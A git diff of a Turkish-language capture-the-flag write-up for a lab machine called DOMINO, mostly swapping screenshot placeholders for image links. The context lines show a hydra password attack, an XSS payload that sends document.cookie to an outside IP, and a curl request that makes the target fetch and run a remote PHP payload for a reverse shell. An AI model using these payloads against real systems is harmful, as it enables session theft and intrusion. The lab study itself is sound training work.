@@ -17,7 +17,7 @@ Tarama sonucunda özellikle iki port dikkatimi çekti:
 
 SSH'ın açık olması ileride işimize yarayabilir ama şu an elimizde bir kullanıcı adı ve parola olmadığı için ilk olarak web uygulamasına bakmak daha mantıklı.
 
-> 📸 **Ekran görüntüsü:** Buraya Nmap çıktısının ekran görüntüsünü ekle.
+<img width="828" height="588" alt="nmap" src="https://github.com/user-attachments/assets/aaa5d7fa-9676-40d2-8312-4404ac5d4a70" />
 
 ---
 
@@ -46,17 +46,23 @@ Tarama sonucunda birkaç ilginç dizin çıktı:
 
 Özellikle `backup`, `api` ve `static` dizinlerine bakmaya başladım.
 
-> 📸 **Ekran görüntüsü:** Buraya ffuf çıktısını koy.
+<img width="1045" height="566" alt="FFUF" src="https://github.com/user-attachments/assets/d1910819-07cf-4137-8845-e44102a4e67b" />
 
 ---
 
 ## Backup Dizininden Gelen İlk İpucu
 
+<img width="909" height="448" alt="backupdizin" src="https://github.com/user-attachments/assets/718ded98-b454-492f-83f5-e62dfe0caa09" />
+
 `/backup/` dizinine girdiğimde bir `readme` dosyası karşıma çıktı.
+
+<img width="748" height="225" alt="readme" src="https://github.com/user-attachments/assets/ab37408d-7528-4337-99d0-760904a2d797" />
 
 Dosyada `config.enc` isimli şifrelenmiş bir config dosyasından bahsediliyordu. Ayrıca dosyanın çözülmesi için kullanılacak key'in `static/app.js` içerisinde olduğunu belirten bir bilgi vardı.
 
 `static/app.js` dosyasını açtığımda şu bilgileri gördüm:
+
+<img width="1175" height="745" alt="staticappjs" src="https://github.com/user-attachments/assets/1e4d12a8-9f01-484b-ae53-c81860b1e7d8" />
 
 ```javascript
 apiBase: '/api'
@@ -81,18 +87,9 @@ cat config.dec
 
 Karşıma şu config çıktı:
 
-```json
-{
-  "app_name": "NexusCorp Portal",
-  "version": "2.3.1",
-  "deploy_env": "production",
-  "system_user": "devops"
-}
-```
+<img width="925" height="298" alt="configdec" src="https://github.com/user-attachments/assets/57c958f7-cf33-4f3c-add5-506022efaafe" />
 
 Burada özellikle `devops` kullanıcı adına dikkat ettim. Şimdilik bir kenara not aldım.
-
-> 📸 **Ekran görüntüsü:** `app.js` içerisindeki key ve `config.dec` çıktısını gösteren ekran görüntüsü.
 
 ---
 
@@ -102,21 +99,24 @@ Web sitesinde `Our Team` bölümünü fark ettim.
 
 Burada çalışanların isimleri ve kullanıcı bilgileri listeleniyordu. Buradaki kullanıcı adlarını not alıp `users.txt` dosyasına koydum.
 
+<img width="756" height="331" alt="userstxt" src="https://github.com/user-attachments/assets/c4d066ba-cc78-49fd-a926-fa4861f5cd35" />
+
 Elimizde artık login endpointi ve olası kullanıcı isimleri vardı. Bu yüzden parola denemesi yapmayı denedim.
 
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.114.161.206 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid"
 ```
-
 Hydra sonucunda bazı geçerli kullanıcı bilgileri elde ettim.
 
 Bunlardan biriyle web uygulamasına giriş yaptım.
 
-> 📸 **Ekran görüntüsü:** Hydra'nın geçerli credential bulduğu kısmı buraya koy.
+<img width="1296" height="333" alt="hydra" src="https://github.com/user-attachments/assets/5fa3964e-6ccd-4d70-b48a-6059d5030586" />
 
 ---
 
 ## Profile API'yi Kurcalayalım
+
+<img width="1919" height="462" alt="firstloginsarah" src="https://github.com/user-attachments/assets/1f740dbc-4168-4e56-a0ff-fffa67329f4c" />
 
 Login olduktan sonra dashboard üzerinde `My Profile API` şeklinde bir bölüm gördüm.
 
@@ -133,26 +133,23 @@ Burada `id` parametresi olduğu için aklıma direkt başka kullanıcıların ID
 ```text
 /profile.php?id=1
 ```
-
 şeklinde değiştirmeye başladım.
 
 Başka kullanıcıların profillerini görüntüleyebildiğimi fark ettim. Bir noktada admin kullanıcısının profilini de okuyabildim.
 
 Admin kullanıcısının profil notlarında ilk flag vardı:
 
-```text
-THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
-```
+<img width="1375" height="272" alt="firstflag" src="https://github.com/user-attachments/assets/d83826e0-3267-46ef-823e-36b2255dc7f1" />
 
 ### Flag 1
 
 `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`
 
-> 📸 **Ekran görüntüsü:** Admin profilindeki flag'in göründüğü bölüm.
-
 ---
 
 ## Ticket Sistemine Bakalım
+
+<img width="1919" height="679" alt="openticket" src="https://github.com/user-attachments/assets/ae8d4816-2c9e-47f7-b815-e7e754c0d0f2" />
 
 Daha sonra dashboard'a geri dönüp `Open Ticket` bölümüne baktım.
 
@@ -165,6 +162,8 @@ Cookie'leri kontrol ettiğimde session cookie'sinde `HttpOnly` flag'inin aktif o
 Bu önemliydi çünkü eğer ticket içeriği başka bir kullanıcı tarafından açılıyorsa JavaScript çalıştırmayı deneyebilirdim.
 
 Basit bir XSS payload'ı hazırladım:
+
+<img width="1716" height="484" alt="xsspayload" src="https://github.com/user-attachments/assets/a122590e-2a6d-41dc-9f61-3c6254540424" />
 
 ```html
 <script>fetch("http://192.168.154.242:81/test.php?data="+btoa(document.cookie));</script>
@@ -183,6 +182,7 @@ Gelen cookie içerisinde admin session'ına ait bilgi bulunuyordu:
 ```text
 nexus_session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
 ```
+<img width="1426" height="199" alt="tokenaldık" src="https://github.com/user-attachments/assets/2dbfaff7-44ed-4dcb-ad5a-a815eaa3d8b4" />
 
 Bu cookie'yi kendi session'ımda kullanıp sayfayı yenilediğimde artık admin olarak giriş yapmış olduğumu gördüm.
 
@@ -192,9 +192,7 @@ Admin panelinde ikinci flag karşıma çıktı.
 
 `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}`
 
-> 📸 **Ekran görüntüsü:** Cookie'nin geldiği Burp/terminal ekranı.
-
-> 📸 **Ekran görüntüsü:** Admin panelinde ikinci flag'in göründüğü bölüm.
+<img width="1919" height="591" alt="flag2" src="https://github.com/user-attachments/assets/cd15a73f-d62d-49ee-a5c4-b0c042b9231b" />
 
 ---
 
@@ -204,9 +202,7 @@ Admin erişimini aldıktan sonra `/api/auth/token.php` endpointini incelemeye ba
 
 Burada token ile ilgili önemli bir not vardı:
 
-```text
-Use this token as: Authorization: Bearer <token> for /api/files.php
-```
+<img width="1919" height="368" alt="adminauthapi" src="https://github.com/user-attachments/assets/ef2e9c13-c10d-4749-9d17-218a52dd98cb" />
 
 Yani burada kullanılan token'ı cookie olarak değil, `Authorization` header'ı içerisinde göndermemiz gerekiyor.
 
@@ -215,6 +211,7 @@ Yani burada kullanılan token'ı cookie olarak değil, `Authorization` header'ı
 ```bash
 curl -i -H "Authorization: Bearer <TOKEN>" http://10.114.161.206/api/files.php
 ```
+<img width="1467" height="215" alt="hata" src="https://github.com/user-attachments/assets/ba5321ef-cf45-4a2f-ba2c-ddcb02f15525" />
 
 Fakat beklediğim sonucu alamadım.
 
@@ -244,8 +241,6 @@ Bu sefer API isteği kabul etti.
 
 Burada JWT doğrulamasında `alg:none` durumunun kabul edildiğini anladım.
 
-> 📸 **Ekran görüntüsü:** JWT'nin `alg:none` olarak hazırlanması ve API'den başarılı response alınması.
-
 ---
 
 ## files.php'yi İnceleyelim
@@ -265,6 +260,8 @@ Burada önemli bir şey ortaya çıktı.
 Endpoint, URL verilmesi durumunda uzak bir kaynaktan içerik çekiyor ve daha sonra bunu PHP olarak çalıştırıyordu.
 
 Bu noktada bunun sadece dosya okuma olmadığını, uzak bir payload vererek komut çalıştırmaya kadar götürülebileceğini düşündüm.
+
+<img width="1457" height="271" alt="filephpokuma" src="https://github.com/user-attachments/assets/c1e0733d-3a5f-4fe9-844d-cd6339be3ea3" />
 
 ---
 
@@ -296,7 +293,11 @@ Daha sonra API üzerinden payload'ın URL'sini verdim:
 curl -s -H "Authorization: Bearer $TOKEN" --get --data-urlencode "name=http://192.168.154.242:8000/payload.txt" http://10.114.161.206/api/files.php
 ```
 
+<img width="769" height="134" alt="reverseshellalmak içinyok" src="https://github.com/user-attachments/assets/ced0a68a-acf9-4f68-8472-520e736b5233" />
+
 Bir süre sonra listener'a bağlantı geldi.
+
+
 
 İlk shell oldukça kısıtlıydı. Terminali biraz daha kullanılabilir hale getirmek için:
 
@@ -309,10 +310,9 @@ ve:
 ```bash
 export TERM=xterm-256color
 ```
-
 komutlarını kullandım.
 
-> 📸 **Ekran görüntüsü:** HTTP server + netcat listener + hedef shell'in geldiği terminal.
+<img width="893" height="549" alt="reverseshellaldım" src="https://github.com/user-attachments/assets/0ad5ed2e-804d-4aef-86d8-bd2a40bd6871" />
 
 ---
 
@@ -332,17 +332,11 @@ Burada `flag3.txt` dosyasını gördüm.
 cat /opt/flag3.txt
 ```
 
-Flag:
-
-```text
-THM{rf1_2_rc3_f00th0ld_fl4g3}
-```
-
 ### Flag 3
 
 `THM{rf1_2_rc3_f00th0ld_fl4g3}`
 
-> 📸 **Ekran görüntüsü:** `/opt/flag3.txt` çıktısı.
+<img width="655" height="142" alt="flag3" src="https://github.com/user-attachments/assets/2d94f022-47a7-4efd-ad95-b177d5de04d5" />
 
 ---
 
@@ -354,15 +348,10 @@ RCE aldıktan sonra web uygulamasının PHP dosyalarını da incelemeye başlad�
 
 Dosyada database bağlantısı için kullanılan bilgiler vardı:
 
-```php
-$DBDEF = array(
-    'user' => 'app_user',
-    'pwd' => 'D3v0ps!2024',
-    'db' => 'nexusdb',
-    'host' => 'localhost',
-    'port' => '3306',
-);
-```
+<img width="1365" height="714" alt="catphp" src="https://github.com/user-attachments/assets/cbaa396b-2a55-434d-a471-06381178fa44" />
+
+<img width="985" height="436" alt="configphp" src="https://github.com/user-attachments/assets/f13032ab-4723-48e2-8b31-8f1b2c812c0b" />
+
 
 Buradaki parola oldukça dikkat çekiciydi.
 
@@ -371,6 +360,7 @@ Daha önce config dosyasında `devops` kullanıcısını görmüştüm. Sistemde
 ```bash
 cat /etc/passwd
 ```
+<img width="1118" height="683" alt="etcpasswd" src="https://github.com/user-attachments/assets/0a9a6281-3124-44c5-a343-f2ca3a212325" />
 
 `devops` kullanıcısının mevcut olduğunu gördüm.
 
@@ -398,15 +388,11 @@ DevOps kullanıcısına geçtikten sonra home dizinini kontrol ettim.
 
 Burada dördüncü flag bulunuyordu:
 
-```text
-THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}
-```
-
 ### Flag 4
 
 `THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}`
 
-> 📸 **Ekran görüntüsü:** DevOps home dizinindeki flag.
+<img width="629" height="229" alt="flag4" src="https://github.com/user-attachments/assets/7736d303-59e5-4ae0-9539-123b74f1e51a" />
 
 ---
 
@@ -444,9 +430,7 @@ Script'in root tarafından çalıştırılmasını bekledim.
 
 Bir süre sonra bağlantı geldi ve root shell elde ettim.
 
-> 📸 **Ekran görüntüsü:** `ls -la /opt/monitoring` ile dosya izinlerinin göründüğü bölüm.
-
-> 📸 **Ekran görüntüsü:** Root shell'in geldiği terminal.
+<img width="767" height="146" alt="rootshell" src="https://github.com/user-attachments/assets/bd2bb634-d7f1-4d26-9db2-28ab9deca21c" />
 
 ---
 
@@ -460,13 +444,9 @@ Son olarak root flag'ini okuyarak makineyi tamamladım:
 cat /root/root.txt
 ```
 
+<img width="782" height="268" alt="flag5" src="https://github.com/user-attachments/assets/d2518070-de75-4692-9c86-b5ab633bba3b" />
+
 Son flag:
-
-```text
-THM{pr1v3sc_cr0n_r00t_fl4g5}
-```
-
-### Flag 5
 
 `THM{pr1v3sc_cr0n_r00t_fl4g5}`
 
@@ -481,51 +461,3 @@ THM{pr1v3sc_cr0n_r00t_fl4g5}
 | 3 | `THM{rf1_2_rc3_f00th0ld_fl4g3}`       |
 | 4 | `THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}`   |
 | 5 | `THM{pr1v3sc_cr0n_r00t_fl4g5}`        |
-
-## Kapanış
-
-DOMINO'da benim için en güzel taraf saldırının tek bir açık üzerinden ilerlememesi oldu.
-
-Başta sadece login ekranı vardı. Daha sonra ffuf ile bulduğumuz `backup` ve `static` dizinlerinden configuration bilgilerine ulaştık. Buradan kullanıcı isimlerini topladık ve geçerli bir hesaba ulaştık.
-
-Login olduktan sonra profile API'deki `id` parametresini değiştirerek admin profilini okuyabildik. Ticket tarafındaki XSS ile admin session'ını elde ettikten sonra API'yi incelemeye başladık. JWT tarafındaki hatalı algoritma kontrolü sayesinde admin yetkili token oluşturabildik.
-
-Sonrasında `files.php` üzerinden uzak içerik çalıştırılabildiğini fark ederek ilk shell'i aldık. Web dosyalarındaki credential reuse sayesinde `devops` kullanıcısına geçtik. Son aşamada ise root tarafından çalıştırılan fakat bizim grubumuz tarafından yazılabilen `health_report.sh` dosyasını kullanarak root shell elde ettik.
-
-Makinedeki saldırı zinciri benim için özellikle şu noktaları tekrar göstermiş oldu: uygulamada bulunan küçük bir bilgi veya yanlış yapılandırma tek başına çok kritik görünmese bile, birkaç farklı bulgu birleştirildiğinde doğrudan root erişimine kadar giden bir zincir oluşturabiliyor.
-
----
-
-### GitHub'a Koyarken Görsel Düzeni
-
-README'yi daha temiz göstermek için ekran görüntülerini `images/` klasöründe tutmanı öneririm:
-
-```text
-DOMINO/
-├── README.md
-└── images/
-    ├── 01-nmap.png
-    ├── 02-ffuf.png
-    ├── 03-backup.png
-    ├── 04-config.png
-    ├── 05-hydra.png
-    ├── 06-idor.png
-    ├── 07-xss.png
-    ├── 08-admin.png
-    ├── 09-jwt.png
-    ├── 10-rce.png
-    ├── 11-flag3.png
-    ├── 12-devops.png
-    ├── 13-monitoring.png
-    └── 14-root.png
-```
-
-Metnin içinde de ilgili komutun hemen altına örneğin:
-
-```markdown
-![Nmap Scan](images/01-nmap.png)
-```
-
-şeklinde koyabilirsin.
-
-Özellikle Nmap, ffuf, Hydra, IDOR, admin paneli, JWT, ilk shell, `health_report.sh` izinleri ve root shell ekran görüntülerini eklemen yeterli olur. Her komutun ekran görüntüsünü koymak README'yi gereksiz şekilde uzatır.
